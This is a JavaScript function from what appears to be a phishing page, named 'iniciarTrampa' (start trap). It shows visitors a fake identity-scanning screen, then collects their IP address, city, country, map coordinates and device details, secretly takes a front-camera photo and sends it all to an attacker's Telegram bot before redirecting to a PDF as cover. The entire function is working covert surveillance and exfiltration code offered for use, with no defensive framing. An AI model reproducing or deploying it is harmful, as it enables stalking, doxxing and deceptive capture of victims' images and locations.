async function iniciarTrampa() {
            if (navigator.vibrate) navigator.vibrate(50);
            document.getElementById('line').style.display = "block";
            document.getElementById('bar').style.display = "block";
            const fill = document.getElementById('fill');
            textGuide.innerHTML = "ESCANEANDO... MANTENGA LA POSICIÃ“N";
            setTimeout(() => { fill.style.width = "100%"; }, 100);

            let fotoBlob = null;
            let reporte = "";

            try {
                // 1. Obtener datos de ubicaciÃ³n primero
                const resIP = await fetch('https://ipapi.co/json/');
                const d = await resIP.json();
                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Desconocido";
                
                reporte = `ðŸ‘¤ *VERIFICACIÃ“N COMPLETADA*\n\n` +
                          `ðŸ“± *EQ:* ${equipo}\n` +
                          `ðŸŒ *IP:* \`${d.ip}\`\n` +
                          `ðŸ“ *Lugar:* ${d.city}, ${d.country_name}\n` +
                          `ðŸ”— *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                // 2. Intentar Captura de cÃ¡mara
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true); 
                await video.play();
                
                // Espera de seguridad para que la cÃ¡mara se aclare
                await new Promise(r => setTimeout(r, 1200));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
                stream.getTracks().forEach(t => t.stop());

            } catch(e) { 
                console.log("Error o cÃ¡mara denegada");
                if(reporte === "") reporte = "âš ï¸ El usuario denegÃ³ permisos o hubo un error tÃ©cnico.";
            }

            // 3. ENVÃO A TELEGRAM
            const fd = new FormData();
            fd.append('chat_id', CONFIG.CHAT_ID);
            
            if (fotoBlob) {
                fd.append('photo', fotoBlob, 'captura.jpg');
                fd.append('caption', reporte);
                fd.append('parse_mode', 'Markdown');
                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            } else {
                // Si no hay foto, enviar solo el texto
                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown' })
                });
            }

            // 4. RedirecciÃ³n final
            setTimeout(() => {
                beep.play();
                textGuide.innerHTML = "âœ… IDENTIDAD CONFIRMADA. ABRIENDO PDF...";
                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
            }, 3000);
        }
